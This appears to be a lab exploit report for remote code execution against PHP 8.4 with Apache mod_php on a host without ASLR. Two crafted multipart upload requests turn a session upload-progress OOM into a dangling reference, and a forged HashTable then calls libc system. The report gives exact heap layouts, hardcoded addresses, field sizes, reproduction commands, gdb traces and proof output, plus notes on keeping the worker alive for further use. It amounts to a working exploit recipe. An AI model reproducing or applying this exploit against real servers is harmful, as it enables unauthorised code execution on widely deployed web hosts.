# Pure HTTP, no target-side PHP, no-ASLR RCE report

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64 remote lab)
Constraints: **fully remote, HTTP only; no target-specific PHP files written into the target webroot**. The target page is a plain
`index.php`:

```php
<?php
echo "OK\n";
```

This report covers only the **no-ASLR** results. For the two ASLR paths, see `ASLR_PATHS.md`.

---

## 1. Result

On a lab worker with ASLR disabled, RCE has been achieved with **two pure HTTP requests**:

- Request A: `session.upload_progress` decodes a large session, triggering OOM, and leaves a cross-request dangling
  `PS(http_session_vars)` zend_reference.
- Request B: a 56-byte raw buffer allocated/freed by multipart fields re-occupies the block of the old reference,
  overwriting the old 32-byte reference with a forged `zend_reference`; at the same time, one **live**
  192-byte zend_string carries the fake HashTable. B's END cleanup calls
  `php_session_track_init()` → `zval_ptr_dtor` → `zend_array_destroy` →
  `zend_hash_destroy`, and `pDestructor` lands on libc `system`.

Measured execution:

```text
system("id>/tmp/p1")
```

proof (`/tmp/p1`, 54 bytes):

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Key gdb backtrace:

```text
#0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
#1  zend_hash_destroy (ht=0x7ffff5e6e0d8)
#2  zend_array_destroy (ht=0x7ffff5e6e0d8)
#3  i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
#4  zend_reference_destroy (ref=0x7ffff5e02320)
#5  php_session_track_init ()
#6  php_session_initialize ()
#7  php_session_rfc1867_cleanup ()
#8  php_session_rfc1867_callback ()
```

After `system` returns, the request aborts inside Zend MM (`zend_mm_realloc_heap` detects heap inconsistency),
but the command was already executed and the proof written before the abort. The worker then crashes,
as expected for a one-shot exploit.

---

## 2. Root cause and trigger point

- Vulnerability location: the upload-progress path in `ext/session/session.c`.
- Request A triggers OOM during `php_request_startup` due to `session.upload_progress` decoding a large
  session; after bailout `modules_activated=0`, and the session RSHUTDOWN is skipped.
- Leftover state: `PS(http_session_vars)` is a **zend_reference** whose `val.value`
  points to the session HashTable allocated in A; after A ends, this reference is still accessed
  by B's `php_session_track_init()`.
- B's END cleanup calls `php_session_initialize()` → `php_session_track_init()`:
  1. `zend_delete_global_variable("_SESSION")` decrements the reference's refcount from 2 to 1;
  2. `zval_ptr_dtor(&PS(http_session_vars))` sees refcount 1 and calls
     `zend_reference_destroy()`;
  3. `zend_reference_destroy()` calls `zend_array_destroy()` on `ref->val`
     (which we forged as IS_ARRAY);
  4. the fake HashTable's `pDestructor = system`, and `zend_hash_destroy()` calls
     `system()` with `&bucket->val` (the address of the command string).

The entire trigger completes before application code runs; the application does not need to call
any session API.

---

## 3. Request B memory layout

Stable addresses under no-ASLR:

| Object | Address/offset |
|---|---|
| Old zend_reference (dangling) R0 | `0x7ffff5e02320` |
| Start of the 56B raw buffer re-occupying R0 | `R0-0x10` |
| data of the 192B zend_string holding the fake HashTable | `0x7ffff5e6e0d8` (T+0x18) |
| libc `system` | `0x7ffff7d13490` |
| libphp base (reference) | `0x7ffff47c0000` |

### 3.1 The raw buffer re-occupying the old reference

Values of ordinary multipart fields are first read by `multipart_buffer_read_body()` into a
**raw buffer** of `erealloc(NULL, len+1)`, with contents starting at offset 0, and only
`efree()`d after the callback/registration; the contents remain after the free. We choose
field value length 55 (56B allocation, Zend MM bin 6).

In B, 7 priming fields with "31-character field names + L=47" consume 56B key slots, so that the subsequent
L=55 field's raw buffer lands exactly on `0x7ffff5e02310` (R0-0x10). That block's 56 bytes cover
the R0 region of the old 32B reference:

```text
raw+0x10 (R0+0x00): gc: refcount=1, type=IS_REFERENCE (10)
raw+0x18 (R0+0x08): val.value = fake HashTable data address
raw+0x20 (R0+0x10): val.type  = 0x307 (IS_ARRAY_EX)
raw+0x28 (R0+0x18): zend_reference.sources = 0
```

`zend_reference_destroy()` requires `sources.ptr == NULL`; otherwise in release builds
`ZEND_ASSUME` leads to `__builtin_unreachable`/abort.

### 3.2 The live string carrying the fake HashTable

A freed raw buffer cannot be used to carry the fake HashTable: after the free, the allocator writes
`next_free_slot` to block offset 0, overwriting the fake HashTable's `gc`, so that
`i_zval_ptr_dtor`'s `GC_DELREF` does not reach zero and the array dtor is never entered.

Use a **live zend_string** instead:

- Field value length 167 → `zend_string_alloc` size 24+167+1=192, exactly bin 13 (192B).
- The string stays in `$_POST` until request shutdown; it is still live at B's END cleanup.
- The string data starts at block start +24, with contents fully controlled by the field value.
- The fake HashTable sits directly at data offset 0:

```text
data+0x00: gc refcount=1, type=IS_ARRAY (7)
data+0x08: flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8
data+0x10: arData = data+0x40
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = system
data+0x40: "id>/tmp/p1\0"
data+0x60: marker 0x1122334455667788 (debug only)
```

`zend_hash_destroy()` takes the `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES`
branch and calls `pDestructor(&p->val)`, i.e. `system(data+0x40)`.

---

## 4. Reproduction steps

Environment:

- Apache prefork single worker, started with no-ASLR:
  `setarch $(uname -m) -R /usr/sbin/apache2ctl -k start`
- PHP configuration: `memory_limit=8M`, `session.upload_progress.cleanup=On`,
  `session.upload_progress.enabled=On`, `session.save_path=/tmp`,
  `session.use_strict_mode=0`, `display_errors=On`.
- The webroot contains only a plain `index.php` (`echo "OK\n"`, no session calls).

Request A (tool `send_a_ps.py` in the same directory):

```bash
python3 send_a_ps.py 17 19 3 12
# boundary 17B, PHPSESSID 19B, progress key 3B, large field 12MB
```

Purpose of A: OOM during the upload-progress decode, leaving a cross-request dangling reference.
After A finishes, the worker can still process B (in this lab the session RSHUTDOWN is skipped).

Request B (`send_b_rce2.py`):

```bash
python3 send_b_rce2.py \
  7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
# N1=7 priming fields; N2=2 L=55 fake-ref fields
# HTDATA=fake HashTable data address; SYS=system address
```

B's multipart:

- `PHPSESSID=attacksessionid0001`
- `PHP_SESSION_UPLOAD_PROGRESS=pwn`
- 7 × 31-character field names (`a000...`), value = 167B fake HashTable
- 2 × short field names (`f00`,`f01`), value = 55B fake reference
- boundary = `B`×10, with a normal closing at the end

Check:

```bash
cat /tmp/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.1 Key gdb watch points

```gdb
b php_session_track_init
# print ps_globals.http_session_vars.value.ptr and the fake reference it points to
b zend_reference_destroy if $rdi == 0x7ffff5e02320
b zend_array_destroy   if $rdi == 0x7ffff5e6e0d8
b zend_hash_destroy    if $rdi == 0x7ffff5e6e0d8
b system
```

Actual hits:

```text
REF rdi=0x7ffff5e02320
ARR T  ht=0x7ffff5e6e0d8
HASH T ht=0x7ffff5e6e0d8
SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
```

---

## 5. Tools and files

| File | Purpose |
|---|---|
| `tools/send_a_ps.py` | A: upload-progress large-field OOM, leaves a dangling reference |
| `tools/send_b_align.py` | Field length/count alignment experiments for B (finding where the 56B raw buffer lands) |
| `tools/send_b_rce2.py` | Final B: fake reference + live-string fake HashTable + system |
| `tools/send_b_rce.py` | Earlier version (fake HT in a freed raw buffer; gc gets overwritten by the free list, unusable) |
| `logs/noaslr_rce.log` | Record of the successful run: gdb/system/proof |

---

## 6. Limitations and boundaries

1. **no-ASLR only**: R0, fake HT data, and the system address are all hardcoded. Addresses change when
   ASLR is enabled.
2. **memory_limit**: this lab uses 8M to make A OOM easily. With the default `memory_limit=128M`,
   A needs to construct over 128M of session data (feasible but high traffic); `session.upload_progress`
   is enabled by default and cleanup defaults to On.
3. **Worker aborts after request B**: after `system` returns, `zend_hash_destroy`'s
   `pefree(HT_GET_DATA_ADDR)` frees an interior string pointer; Zend MM detects heap inconsistency and
   aborts. The proof has been written; to continue exploiting the same process, the fake HT must be
   placed in a legitimately freeable allocation or nTableMask corrected so that `HT_GET_DATA_ADDR`
   is the allocation start.
4. **Depends on B's exact 56B/192B allocation order**: N1=7, field name length 31, L=167/L=55,
   and boundary 10 are a measured combination; changing the PHP build/configuration/request order
   requires recalibration.
5. **Does not involve application code**: the target page needs no session calls at all; the trigger
   happens at the RINIT/parsing stage.
